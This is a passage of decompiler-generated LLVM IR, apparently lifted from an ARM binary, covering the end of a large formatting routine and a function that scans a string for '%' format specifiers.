  store i32 %v0_db50, i32* %r0.global-to-local, align 4
  %v1_db58 = inttoptr i32 %v0_db50 to i32*
  %v2_db58 = load i32, i32* %v1_db58, align 4
  store i32 %v2_db58, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_db60 = call i32 @function_eff8(i32 %v2_db58, i32 %v2_db54, i32 128)
  store i32 %v3_db60, i32* %r0.global-to-local, align 4
  store i32 %v3_db60, i32* @r6, align 4
  br label %dec_label_pc_db00

dec_label_pc_db6c:                                ; preds = %dec_label_pc_d9f8, %.thread26, %bb160
  %v0_db8c.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_d98c, %dec_label_pc_d9f8 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_db88thread-pre-split

dec_label_pc_db74:                                ; preds = %dec_label_pc_da5c, %dec_label_pc_daf4
  store i32 ptrtoint ([7 x i8]* @global_var_16974.336 to i32), i32* @r6, align 4
  br label %dec_label_pc_db7c

dec_label_pc_db7c:                                ; preds = %bb164, %dec_label_pc_db74
  %storemerge = phi i32 [ 6, %dec_label_pc_db74 ], [ %v2_db14, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_db88

dec_label_pc_db88thread-pre-split:                ; preds = %.thread90, %dec_label_pc_db20, %dec_label_pc_db6c, %dec_label_pc_dacc
  %v1_db8c.pre = phi i32 [ 0, %dec_label_pc_db6c ], [ %v1_db8c.pre.pre, %dec_label_pc_dacc ], [ 0, %dec_label_pc_db20 ], [ %v2_d9f8, %.thread90 ]
  %v0_db8c.pre = phi i32 [ %v0_db8c.pre81, %dec_label_pc_db6c ], [ %v0_db8c.pre.pre, %dec_label_pc_dacc ], [ 1, %dec_label_pc_db20 ], [ %v1_d98c, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_d980, %dec_label_pc_db6c ], [ %v0_d8ac, %dec_label_pc_dacc ], [ %v0_d8ac, %dec_label_pc_db20 ], [ %v0_d980, %.thread90 ]
  %v0_db88.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_db88

dec_label_pc_db88:                                ; preds = %dec_label_pc_db88thread-pre-split, %dec_label_pc_da98, %dec_label_pc_db7c
  %v1_dbc8 = phi i32 [ %v1_db8c.pre, %dec_label_pc_db88thread-pre-split ], [ %v0_da98, %dec_label_pc_da98 ], [ 0, %dec_label_pc_db7c ]
  %v0_db8c = phi i32 [ %v0_db8c.pre, %dec_label_pc_db88thread-pre-split ], [ %v0_da88, %dec_label_pc_da98 ], [ %storemerge, %dec_label_pc_db7c ]
  %v0_db94 = phi i32 [ %v0_db88.pr, %dec_label_pc_db88thread-pre-split ], [ 11, %dec_label_pc_da98 ], [ 11, %dec_label_pc_db7c ]
  %v0_dbd0 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_db88thread-pre-split ], [ %v0_d8ac, %dec_label_pc_da98 ], [ %v0_d8ac, %dec_label_pc_db7c ]
  %v7_db88 = icmp eq i32 %v0_db94, 11
  %v2_db8c = add i32 %v0_db8c, %v1_dbc8
  br i1 %v7_db88, label %dec_label_pc_dba4, label %bb165

bb165:                                            ; preds = %dec_label_pc_db88
  %v7_db9c = icmp sgt i32 %v0_db94, 5
  %. = select i1 %v7_db9c, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_dba0 = add i32 %., %v2_db8c
  br label %dec_label_pc_dba4

dec_label_pc_dba4:                                ; preds = %dec_label_pc_db88, %bb165
  %v0_dbb8 = phi i32 [ %v2_db8c, %dec_label_pc_db88 ], [ %v2_dba0, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_dba8 = sub i32 %tmp97, %v0_dbb8
  %v3_dba8 = icmp uge i32 %tmp97, %v0_dbb8
  %v9_dba8 = icmp eq i32 %tmp97, %v0_dbb8
  %v2_dbac = xor i1 %v3_dba8, true
  %v3_dbac = or i1 %v9_dba8, %v2_dbac
  br i1 %v3_dbac, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_dba4
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_dba4, %bb166
  %v2_dbb0 = xor i1 %v9_dba8, true
  %v3_dbb0 = and i1 %v3_dba8, %v2_dbb0
  br i1 %v3_dbb0, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_dbb8.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_dba8, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_dbc8 = phi i32 [ %v1_dbb8.pre, %._crit_edge ], [ %v2_dba8, %bb168 ]
  %v2_dbb8 = add i32 %v0_dbb8, %stack_var_-336.2
  %v2_dbbc = add i32 %v2_dbb8, %v2_dbc8
  store i32 %v2_dbbc, i32* @ip, align 4
  store i32 %v0_dbd0, i32* %r3.global-to-local, align 4
  %v0_dbc4 = load i32, i32* @sb, align 4
  %v7_dbc4 = icmp eq i32 %v0_dbc4, 48
  br i1 %v7_dbc4, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_dbc8 = add i32 %v2_dbc8, %v1_dbc8
  store i32 %v3_dbc8, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_dbe4 = phi i32 [ %v2_dbc8, %bb169 ], [ 0, %bb170 ]
  %v1_dbd0 = and i32 %v0_dbd0, 8
  store i32 %v1_dbd0, i32* @r8, align 4
  %v2_dbd0 = icmp eq i32 %v1_dbd0, 0
  br i1 %v2_dbd0, label %dec_label_pc_dbdc, label %dec_label_pc_dbf8

dec_label_pc_dbdc:                                ; preds = %.thread29
  %v0_dbdc = load i32, i32* @fp, align 4
  store i32 %v0_dbdc, i32* %r0.global-to-local, align 4
  store i32 %v0_dbe4, i32* %r2.global-to-local, align 4
  %v4_dbe8 = call i32 @function_d63c(i32 %v0_dbdc, i8 32, i32 %v0_dbe4)
  store i32 %v4_dbe8, i32* %r0.global-to-local, align 4
  %v1_dbec = load i32, i32* @sl, align 4
  %v9_dbec = icmp eq i32 %v4_dbe8, %v1_dbec
  br i1 %v9_dbec, label %dec_label_pc_dbf4, label %dec_label_pc_dcd8

dec_label_pc_dbf4:                                ; preds = %dec_label_pc_dbdc
  %v0_dbf4 = load i32, i32* @r8, align 4
  store i32 %v0_dbf4, i32* @sl, align 4
  %v0_dc00.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_dbf8

dec_label_pc_dbf8:                                ; preds = %.thread29, %dec_label_pc_dbf4
  %v0_dc00 = phi i32 [ %v0_db94, %.thread29 ], [ %v0_dc00.pre, %dec_label_pc_dbf4 ]
  %v0_dbfc = load i32, i32* @fp, align 4
  %v2_dc00 = add i32 %v0_dc00, ptrtoint (i32* @global_var_1697c.338 to i32)
  store i32 %v2_dc00, i32* %r0.global-to-local, align 4
  %v2_dc04 = call i32 @function_eb20(i32 %v2_dc00, i32 %v0_dbfc)
  %v0_dc08 = load i32, i32* @fp, align 4
  store i32 %v0_dc08, i32* %r0.global-to-local, align 4
  %v0_dc10 = load i32, i32* @r4, align 4
  store i32 %v0_dc10, i32* %r2.global-to-local, align 4
  %v4_dc14 = call i32 @function_d63c(i32 %v0_dc08, i8 48, i32 %v0_dc10)
  store i32 %v4_dc14, i32* %r0.global-to-local, align 4
  %v1_dc18 = load i32, i32* @r4, align 4
  %v9_dc18 = icmp eq i32 %v4_dc14, %v1_dc18
  br i1 %v9_dc18, label %dec_label_pc_dc20, label %dec_label_pc_dcd8

dec_label_pc_dc20:                                ; preds = %dec_label_pc_dbf8
  %v3_dc20 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dc20, i32* %r3.global-to-local, align 4
  %v2_dc24 = icmp eq i32 %v3_dc20, 0
  br i1 %v2_dc24, label %dec_label_pc_dc34, label %dec_label_pc_dc94thread-pre-split

dec_label_pc_dc34:                                ; preds = %dec_label_pc_dc20
  %v0_dc34 = load i32, i32* @r5, align 4
  %v2_dc34 = icmp eq i32 %v0_dc34, 0
  br i1 %v2_dc34, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_dc34
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_dc34
  %v1_dc3c = load i32, i32* @r6, align 4
  store i32 %v1_dc3c, i32* %r0.global-to-local, align 4
  %v1_dc44 = load i32, i32* @fp, align 4
  store i32 %v1_dc44, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 56396, i32* @lr, align 4
  %v1_dc48 = xor i1 %v2_dc34, true
  call void @__pseudo_cond_branch(i1 %v1_dc48, i32 ptrtoint (i32* @global_var_11230.329 to i32))
  %v0_dc4c = load i32, i32* %r0.global-to-local, align 4
  %v1_dc4c = load i32, i32* @r5, align 4
  %v9_dc4c = icmp eq i32 %v0_dc4c, %v1_dc4c
  br i1 %v9_dc4c, label %dec_label_pc_dcac, label %dec_label_pc_dcd8

dec_label_pc_dc58:                                ; preds = %dec_label_pc_dc94
  %v2_dc58 = icmp ult i32 %v1_dc5c, 128
  %.v1_dc5c = select i1 %v2_dc58, i32 %v1_dc5c, i32 128
  store i32 %.v1_dc5c, i32* @r2, align 4
  %v0_dc64 = call i32 @function_11060()
  store i32 %v0_dc64, i32* @r4, align 4
  %v2_dc68 = icmp eq i32 %v0_dc64, 0
  store i32 %v0_dc64, i32* %r3.global-to-local, align 4
  store i32 %v2_db54, i32* %r0.global-to-local, align 4
  %v0_dc78 = load i32, i32* @fp, align 4
  store i32 %v0_dc78, i32* %r2.global-to-local, align 4
  br i1 %v2_dc68, label %dec_label_pc_dc88, label %dec_label_pc_dc80

dec_label_pc_dc80:                                ; preds = %dec_label_pc_dc58
  %v3_dc80 = call i32 @function_11230(i32 %v2_db54, i32 %v0_dc64, i32 %v0_dc78)
  store i32 %v3_dc80, i32* %r0.global-to-local, align 4
  store i32 %v3_dc80, i32* %r3.global-to-local, align 4
  %v1_dc88.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_dc88

dec_label_pc_dc88:                                ; preds = %dec_label_pc_dc58, %dec_label_pc_dc80
  %v1_dc88 = phi i32 [ 0, %dec_label_pc_dc58 ], [ %v1_dc88.pre, %dec_label_pc_dc80 ]
  %v0_dc8c = phi i32 [ 0, %dec_label_pc_dc58 ], [ %v3_dc80, %dec_label_pc_dc80 ]
  %v9_dc88 = icmp eq i32 %v0_dc8c, %v1_dc88
  %v1_dc8c = load i32, i32* @r5, align 4
  %v2_dc8c = sub i32 %v1_dc8c, %v0_dc8c
  store i32 %v2_dc8c, i32* @r5, align 4
  br i1 %v9_dc88, label %dec_label_pc_dc94, label %dec_label_pc_dcd8

dec_label_pc_dc94thread-pre-split:                ; preds = %dec_label_pc_dc20
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_dc98.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_dc94

dec_label_pc_dc94:                                ; preds = %dec_label_pc_dc94thread-pre-split, %dec_label_pc_dc88
  %v1_dc5c = phi i32 [ %v0_dc98.pr, %dec_label_pc_dc94thread-pre-split ], [ %v2_dc8c, %dec_label_pc_dc88 ]
  store i32 %v2_db54, i32* @r6, align 4
  %v2_dc98 = icmp eq i32 %v1_dc5c, 0
  store i32 %v2_da70, i32* @r1, align 4
  store i32 %v2_da84, i32* %r3.global-to-local, align 4
  store i32 %v2_db54, i32* @r0, align 4
  br i1 %v2_dc98, label %dec_label_pc_dcac, label %dec_label_pc_dc58

dec_label_pc_dcac:                                ; preds = %dec_label_pc_dc94, %.thread36
  %v0_dcac = load i32, i32* @fp, align 4
  store i32 %v0_dcac, i32* %r0.global-to-local, align 4
  %v0_dcb4 = load i32, i32* @sl, align 4
  store i32 %v0_dcb4, i32* %r2.global-to-local, align 4
  %v4_dcb8 = call i32 @function_d63c(i32 %v0_dcac, i8 32, i32 %v0_dcb4)
  store i32 %v4_dcb8, i32* %r0.global-to-local, align 4
  %v1_dcbc = load i32, i32* @sl, align 4
  %v9_dcbc = icmp eq i32 %v4_dcb8, %v1_dcbc
  br i1 %v9_dcbc, label %dec_label_pc_dcc4, label %dec_label_pc_dcd8

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_dcac, %dec_label_pc_da34, %dec_label_pc_d858
  %stack_var_-316.3 = phi i32 [ %v0_d8ac, %dec_label_pc_d858 ], [ %v0_dbd0, %dec_label_pc_dcac ], [ %v0_d8ac, %dec_label_pc_da34 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_d858 ], [ %v2_dbbc, %dec_label_pc_dcac ], [ %v2_da38, %dec_label_pc_da34 ]
  %v3_dcc4 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_dcc4, i32* @r4, align 4
  br label %dec_label_pc_dcc8

dec_label_pc_dcc8:                                ; preds = %dec_label_pc_d768, %dec_label_pc_dcc4
  %v0_dcc8 = phi i32 [ %v0_dcc8.pre, %dec_label_pc_d768 ], [ %v3_dcc4, %dec_label_pc_dcc4 ]
  %v0_d8ac = phi i32 [ %tmp100, %dec_label_pc_d768 ], [ %stack_var_-316.3, %dec_label_pc_dcc4 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_d768 ], [ %stack_var_-336.3, %dec_label_pc_dcc4 ]
  store i32 %v0_dcc8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d780.outer

dec_label_pc_d780.outer:                          ; preds = %dec_label_pc_dcd0, %dec_label_pc_dcc8
  %v5_d7ac = phi i32 [ %v1_d7dc, %dec_label_pc_dcd0 ], [ %v0_dcc8, %dec_label_pc_dcc8 ]
  %v0_d78049 = phi i32 [ %v1_dcd0, %dec_label_pc_dcd0 ], [ %v0_dcc8, %dec_label_pc_dcc8 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_dcd0 ], [ %stack_var_-336.4, %dec_label_pc_dcc8 ]
  %v1_d780180 = inttoptr i32 %v0_d78049 to i8*
  %v2_d780181 = load i8, i8* %v1_d780180, align 1
  %v3_d780182 = zext i8 %v2_d780181 to i32
  store i32 %v3_d780182, i32* %r3.global-to-local, align 4
  %v2_d784183 = icmp eq i8 %v2_d780181, 0
  br i1 %v2_d784183, label %dec_label_pc_d79c, label %bb126

dec_label_pc_dcd0:                                ; preds = %dec_label_pc_d7dc
  %v1_dcd0 = add i32 %v0_d7e4, 2
  store i32 %v1_dcd0, i32* @r4, align 4
  br label %dec_label_pc_d780.outer

dec_label_pc_dcd8:                                ; preds = %dec_label_pc_db48, %dec_label_pc_dcac, %.thread36, %dec_label_pc_dbf8, %dec_label_pc_dbdc, %dec_label_pc_daac, %bb162, %dec_label_pc_da10, %bb130, %dec_label_pc_dc88
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_dce0

dec_label_pc_dce0:                                ; preds = %dec_label_pc_d7d0, %bb, %dec_label_pc_d750, %dec_label_pc_dcd8
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_d750 ], [ -1, %dec_label_pc_dcd8 ], [ %stack_var_-336.2, %dec_label_pc_d7d0 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_d70c, i32* @r5, align 4
  store i32 %v15_d70c, i32* %r8.global-to-local, align 4
  store i32 %v18_d70c, i32* @sb, align 4
  store i32 %v21_d70c, i32* @sl, align 4
  store i32 %v24_d70c, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_dcd0, { 1, 0 }
  uselistorder i8 %v2_d780181, { 1, 2, 0 }
  uselistorder i32 %v0_d78049, { 2, 0, 1 }
  uselistorder i32 %v5_d7ac, { 2, 3, 1, 0 }
  uselistorder i32 %v0_d8ac, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_dcc8, { 1, 0, 2 }
  uselistorder i32 %v1_dc5c, { 2, 1, 0 }
  uselistorder i32 %v0_dc64, { 1, 0, 2, 3 }
  uselistorder i32 %v0_dbe4, { 1, 0 }
  uselistorder i32 %v2_dbc8, { 2, 0, 1 }
  uselistorder i1 %v3_dba8, { 1, 0 }
  uselistorder i32 %v0_dbb8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_db8c, { 1, 0 }
  uselistorder i32 %v0_dbd0, { 1, 0, 2 }
  uselistorder i32 %v3_db60, { 1, 2, 0 }
  uselistorder i32 %v0_db10, { 1, 0 }
  uselistorder i32 %v2_daf4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_dabc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_da88, { 1, 2, 0, 3 }
  uselistorder i32 %v1_d98c, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_d9a8, { 1, 2, 3, 0 }
  uselistorder i32 %v6_d928, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_d88c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_d83c.pre, { 2, 1, 0 }
  uselistorder i32 %v1_d834, { 1, 0 }
  uselistorder i32 %v1_d7dc, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_d79c, { 1, 0 }
  uselistorder i32 %v1_d794.lcssa, { 1, 0 }
  uselistorder i8 %v2_d780, { 1, 2, 0 }
  uselistorder i32 %v2_d794, { 1, 2, 3, 0 }
  uselistorder i1 %v7_d9a0, { 1, 0 }
  uselistorder i1 %v7_d8ec, { 1, 2, 0 }
  uselistorder i1 %v7_dae4, { 1, 0 }
  uselistorder i1 %v7_da44, { 1, 0 }
  uselistorder i1 %v7_d930, { 1, 0 }
  uselistorder i32 %v2_da84, { 0, 2, 1, 3 }
  uselistorder i32 %v2_db54, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_d864, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_d838, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_d818, { 1, 2, 0 }
  uselistorder i32 %v4_d810, { 1, 0 }
  uselistorder i32 %v2_d714, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 34, 35, 3, 4, 36, 37, 2, 38, 39, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r2.global-to-local, { 19, 3, 4, 22, 23, 24, 25, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 2, 17, 18, 20, 21, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 13, 15, 14, 17, 16, 35, 34, 36, 37, 39, 38, 5, 40, 44, 41, 43, 42, 18, 3, 19, 2, 20, 1, 21, 7, 22, 6, 23, 24, 25, 4, 12, 26, 27, 28, 9, 8, 11, 29, 31, 30, 32, 10, 33, 0 }
  uselistorder i32 (i32, i8, i32)* @function_d63c, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_11060, { 1, 0 }
  uselistorder label %dec_label_pc_dce0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_dcd8, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_dcc8, { 1, 0 }
  uselistorder label %dec_label_pc_dc88, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_dbf8, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_dba4, { 1, 0 }
  uselistorder label %dec_label_pc_db88, { 0, 2, 1 }
  uselistorder label %dec_label_pc_db88thread-pre-split, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_db7c, { 1, 0 }
  uselistorder label %dec_label_pc_db74, { 1, 0 }
  uselistorder label %dec_label_pc_db6c, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_db00, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_d8dc, { 1, 0 }
  uselistorder label %dec_label_pc_d8d8, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d830, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_d7d0, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_d79c, { 2, 1, 0 }
}

define i32 @function_dd00(i32* %arg1) local_unnamed_addr {
dec_label_pc_dd00:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_dd00 = load i32, i32* @r4, align 4
  store i32 %v3_dd00, i32* %stack_var_-12, align 4
  %v6_dd00 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_dd0c = load i32, i32* @r1, align 4
  store i32 %v0_dd0c, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_dd14 = bitcast i32* %arg1 to i8*
  %v3_dd14 = call i32 @function_ec20(i8* %v2_dd14, i32 0)
  %v0_dd18 = load i32, i32* @r4, align 4
  %v1_dd18 = add i32 %v0_dd18, 24
  %v2_dd18 = inttoptr i32 %v1_dd18 to i32*
  %v3_dd18 = load i32, i32* %v2_dd18, align 4
  %v1_dd1c = add i32 %v3_dd18, -1
  store i32 %v1_dd1c, i32* %v2_dd18, align 4
  %v0_dd24 = load i32, i32* @r5, align 4
  %v1_dd24 = load i32, i32* @r4, align 4
  %v2_dd24 = inttoptr i32 %v1_dd24 to i32*
  store i32 %v0_dd24, i32* %v2_dd24, align 4
  %v0_dd28 = load i32, i32* @r4, align 4
  %v1_dd28 = add i32 %v0_dd28, 40
  store i32 %v1_dd28, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_dd3819 = inttoptr i32 %v1_dd28 to i32*
  store i32 8, i32* %v2_dd3819, align 4
  %v3_dd3820 = load i32, i32* %r1.global-to-local, align 4
  %v4_dd3821 = add i32 %v3_dd3820, 4
  store i32 %v4_dd3821, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge

dec_label_pc_dd30.dec_label_pc_dd30_crit_edge:    ; preds = %dec_label_pc_dd00, %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge
  %v4_dd3822 = phi i32 [ %v4_dd3821, %dec_label_pc_dd00 ], [ %v4_dd38, %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge ]
  %v0_dd34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_dd34 = add i32 %v0_dd34.pre, -1
  store i32 %v1_dd34, i32* %r2.global-to-local, align 4
  %v7_dd34 = icmp eq i32 %v0_dd34.pre, 1
  %v2_dd38 = inttoptr i32 %v4_dd3822 to i32*
  store i32 8, i32* %v2_dd38, align 4
  %v3_dd38 = load i32, i32* %r1.global-to-local, align 4
  %v4_dd38 = add i32 %v3_dd38, 4
  store i32 %v4_dd38, i32* %r1.global-to-local, align 4
  br i1 %v7_dd34, label %dec_label_pc_dd40, label %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge

dec_label_pc_dd40:                                ; preds = %dec_label_pc_dd30.dec_label_pc_dd30_crit_edge
  %v0_dd40 = load i32, i32* @r5, align 4
  store i32 %v0_dd40, i32* %r2.global-to-local, align 4
  %v1_dd843 = inttoptr i32 %v0_dd40 to i8*
  %v2_dd844 = load i8, i8* %v1_dd843, align 1
  %v2_dd886 = icmp eq i8 %v2_dd844, 0
  br i1 %v2_dd886, label %dec_label_pc_dd90, label %dec_label_pc_dd50

dec_label_pc_dd48:                                ; preds = %dec_label_pc_dd68
  %v2_dd4c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_dd4c, i32* @r4, align 4
  store i32 %v6_dd00, i32* @r5, align 4
  ret i32 -1

dec_label_pc_dd50:                                ; preds = %dec_label_pc_dd40, %dec_label_pc_dd84.backedge
  %v0_dd58 = phi i32 [ %storemerge, %dec_label_pc_dd84.backedge ], [ %v0_dd40, %dec_label_pc_dd40 ]
  %v2_dd847 = phi i8 [ %v2_dd84, %dec_label_pc_dd84.backedge ], [ %v2_dd844, %dec_label_pc_dd40 ]
  %v7_dd50 = icmp eq i8 %v2_dd847, 37
  br i1 %v7_dd50, label %dec_label_pc_dd58, label %dec_label_pc_dd80

dec_label_pc_dd58:                                ; preds = %dec_label_pc_dd50
  %v1_dd58 = add i32 %v0_dd58, 1
  %v2_dd58 = inttoptr i32 %v1_dd58 to i8*
  %v3_dd58 = load i8, i8* %v2_dd58, align 1
  store i32 %v1_dd58, i32* %r2.global-to-local, align 4
  %v7_dd5c = icmp eq i8 %v3_dd58, 37
  br i1 %v7_dd5c, label %dec_label_pc_dd80, label %dec_label_pc_dd68

dec_label_pc_dd68:                                ; preds = %dec_label_pc_dd58
  %v0_dd60 = load i32, i32* @r4, align 4
  %v2_dd68 = inttoptr i32 %v0_dd60 to i32*
  store i32 %v1_dd58, i32* %v2_dd68, align 4
  %v2_dd6c = call i32 @function_dfb8(i32* %v2_dd68)
  %v1_dd70 = icmp slt i32 %v2_dd6c, 0
  br i1 %v1_dd70, label %dec_label_pc_dd48, label %dec_label_pc_dd78

dec_label_pc_dd78:                                ; preds = %dec_label_pc_dd68
  %v0_dd78 = load i32, i32* @r4, align 4
  %v1_dd78 = inttoptr i32 %v0_dd78 to i32*
  %v2_dd78 = load i32, i32* %v1_dd78, align 4
  br label %dec_label_pc_dd84.backedge

dec_label_pc_dd80:                                ; preds = %dec_label_pc_dd50, %dec_label_pc_dd58
  %v0_dd80 = phi i32 [ %v0_dd58, %dec_label_pc_dd50 ], [ %v1_dd58, %dec_label_pc_dd58 ]
  %v1_dd80 = add i32 %v0_dd80, 1
  br label %dec_label_pc_dd84.backedge

dec_label_pc_dd84.backedge:                       ; preds = %dec_label_pc_dd80, %dec_label_pc_dd78
  %storemerge = phi i32 [ %v1_dd80, %dec_label_pc_dd80 ], [ %v2_dd78, %dec_label_pc_dd78 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_dd84 = inttoptr i32 %storemerge to i8*
  %v2_dd84 = load i8, i8* %v1_dd84, align 1
  %v2_dd88 = icmp eq i8 %v2_dd84, 0
  br i1 %v2_dd88, label %dec_label_pc_dd84.dec_label_pc_dd90_crit_edge, label %dec_label_pc_dd50

dec_label_pc_dd84.dec_label_pc_dd90_crit_edge:    ; preds = %dec_label_pc_dd84.backedge
  %v0_dd90.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dd90

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dd84.dec_label_pc_dd90_crit_edge, %dec_label_pc_dd40
  %v0_dd90 = phi i32 [ %v0_dd90.pre, %dec_label_pc_dd84.dec_label_pc_dd90_crit_edge ], [ %v0_dd40, %dec_label_pc_dd40 ]
  %v3_dd84.lcssa.in = phi i8 [ %v2_dd84, %dec_label_pc_dd84.dec_label_pc_dd90_crit_edge ], [ %v2_dd844, %dec_label_pc_dd40 ]
  %v3_dd84.lcssa = zext i8 %v3_dd84.lcssa.in to i32
  %v1_dd90 = load i32, i32* @r4, align 4
  %v2_dd90 = inttoptr i32 %v1_dd90 to i32*
  store i32 %v0_dd90, i32* %v2_dd90, align 4
  %v2_dd94 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_dd94, i32* @r4, align 4
  store i32 %v6_dd00, i32* @r5, align 4
  ret i32 %v3_dd84.lcssa

; uselistorder directives
  uselistorder i8 %v2_dd84, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_dd40, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dd38, { 1, 0 }
  uselistorder i32 %v0_dd34.pre, { 1, 0 }
  uselistorder i32 %v6_dd00, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_dd80, { 1, 0 }
  uselistorder label %dec_label_pc_dd50, { 1, 0 }
